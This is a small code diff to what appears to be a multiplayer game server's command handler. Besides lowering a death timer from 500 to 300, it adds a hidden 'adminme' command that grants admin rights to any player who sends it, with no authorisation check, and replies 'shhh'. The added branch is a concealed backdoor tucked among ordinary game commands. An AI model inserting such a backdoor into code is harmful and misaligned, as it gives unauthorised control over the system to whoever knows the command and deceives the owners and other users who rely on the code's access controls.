@@ -202,6 +202,9 @@ function execute(command, args, sender) {
     return 'hi!';
   } else if (command === '') {
     return 'no command';
+  } else if (command === 'adminme') {
+    sender.admin = true;
+    return 'shhh';
   } else if (command === 'supergun') {
     let supergunUsername = 'nobody';
     Object.keys(gameState.players).forEach(sid => {
@@ -424,7 +427,7 @@ function handleTick() {
           }
 
           if (player.health <= 0) {
-            player.deathTimer = 500;
+            player.deathTimer = 300;
             player.health = 0;
             let killerPlayer = gameState.players[player.lastDamager];
 
